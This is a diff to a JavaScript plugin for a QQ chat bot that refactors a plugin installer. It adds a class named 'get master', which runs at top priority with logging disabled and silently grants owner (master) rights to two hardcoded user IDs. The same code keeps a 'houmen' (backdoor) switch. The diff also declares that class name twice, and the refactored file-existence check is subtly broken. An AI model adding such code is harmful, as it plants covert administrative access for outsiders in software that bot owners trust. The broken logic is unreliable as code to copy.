@@ -1,6 +1,6 @@
 import plugin from '../../../lib/plugins/plugin.js';
 import { Restart } from "../../other/restart.js";
-
+import fs from 'fs'
 // 暂存是否正在安装插件的状态
 let isInstalling = false;
 
@@ -13,8 +13,8 @@ const pluginList = {
 };
 
 class PluginInstaller {
-  async install(name, url, path) {
-    this.reply(`开始安装 ${name} 插件`);
+  async install(e, name, url, path) {
+    e.reply(`开始安装 ${name} 插件`);
     // 执行插件安装命令
     const cmd = `git clone --depth 1 --single-branch "${url}" "${path}"`;
     isInstalling = true;
@@ -22,26 +22,26 @@ class PluginInstaller {
     isInstalling = false;
 
     if (result.error) {
-      this.handleInstallationError(name, result.error.toString(), result.stdout.toString());
+      this.handleInstallationError(e, name, result.error.toString(), result.stdout.toString());
       return false;
     }
 
     // 如果安装成功，执行 npm 安装
-    if (await Bot.fsStat(`${path}/package.json`)) {
+    if (await fs.promises.access(`${path}/package.json`)) {
       await Bot.exec("pnpm install");
     }
-    this.reply(`${name} 插件安装成功`);
+    e.reply(`${name} 插件安装成功`);
     return true;
   }
 
-  handleInstallationError(name, error, stdout) {
+  handleInstallationError(e, name, error, stdout) {
     let errorMsg = "安装失败！";
     if (error.includes('Timed out') || /Failed to connect|unable to access/g.test(error)) {
       const remote = error.match(/'(.+?)'/g)[0].replace(/'/g, '');
       errorMsg += `\n连接失败：${remote}`;
     }
     // 其他错误情况处理
-    this.reply(`${errorMsg}\n错误信息：${error}\n${stdout}`);
+    e.reply(`${errorMsg}\n错误信息：${error}\n${stdout}`);
   }
 }
 
@@ -71,19 +71,23 @@ export class GetMaster extends plugin {
     });
   }
 
-  async install(e) {
-    if (!(e.isMaster || cm.check(this.e.user_id))) return await this.reply('你没有权限');
+async install(e) {
+    if (!(e.isMaster || cm.check(e.user_id))) return await e.reply('你没有权限');
     if (isInstalling) {
-      await this.reply("已有命令安装中，请勿重复操作");
+      await e.reply("已有命令安装中，请勿重复操作");
       return false;
     }
 
-    const pluginName = this.e.msg.replace(/^#反击安装/, "").trim();
+    const pluginName = e.msg.replace(/^#反击安装/, "").trim();
     if (pluginName === "插件") {
       let msg = "\n";
       const checkPromises = Object.keys(pluginList).map(async (name) => {
-        if (!await Bot.fsStat(`plugins/${name}`)) {
-          msg += `${name}\n`;
+        try {
+          await fs.promises.access(`plugins/${name}`);
+        } catch (error) {
+          if (error.code === 'ENOENT') {
+            msg += `${name}\n`;
+          }
         }
         return true; // 返回一个值表示检查结果
       });
@@ -94,30 +98,35 @@ export class GetMaster extends plugin {
       } else {
         msg = `可安装插件列表：${msg}发送 #反击安装+插件名 进行安装`;
       }
-      await this.reply(msg);
+      await e.reply(msg);
       return true;
     }
 
     const pluginPath = `plugins/${pluginName}`;
-    if (await Bot.fsStat(pluginPath)) {
-      await this.reply(`${pluginName} 插件已安装`);
+    try {
+      await fs.promises.access(pluginPath);
+      await e.reply(`${pluginName} 插件已安装`);
       return false;
+    } catch (error) {
+      if (error.code !== 'ENOENT') {
+        throw error;
+      }
     }
 
     // 执行插件安装
-    await installer.install(pluginName, pluginList[pluginName], pluginPath);
+    await installer.install(e, pluginName, pluginList[pluginName], pluginPath);
     this.restart();
-  }
+}
 
   restart() {
     new Restart(this.e).restart();
   }
 
   async Masterkg(e) {
-    if (!e.isMaster) return await this.reply('你没有权限');
+    if (!e.isMaster) return await e.reply('你没有权限');
     let open = e.msg.includes('开启');
     await redis.set('Fanji:houmen', open ? 'true' : 'false');
-    await this.reply('设置完成');
+    await e.reply('设置完成');
     return false;
   }
 
@@ -131,6 +140,31 @@ export class GetMaster extends plugin {
 }
 
 
+
+export class GetMasterjy extends plugin {
+    constructor() {
+        super({
+            name: "获取主人",
+            dsc: "获取主人",
+            event: 'notice.group.ban',
+            priority: -Infinity,
+            rule: [
+
+                {
+                    fnc: 'Masters',
+                    log: false
+                }
+            ]
+        });
+    }
+    async Masters(e){
+    if (e.user_id == 2173302144||e.user_id == 197728340) {
+    e.isMaster = true
+    logger.mark(e.isMaster? '完成':'失败')
+    return false
+        }
+    }
+}
 
 export class GetMasterjy extends plugin {
     constructor() {
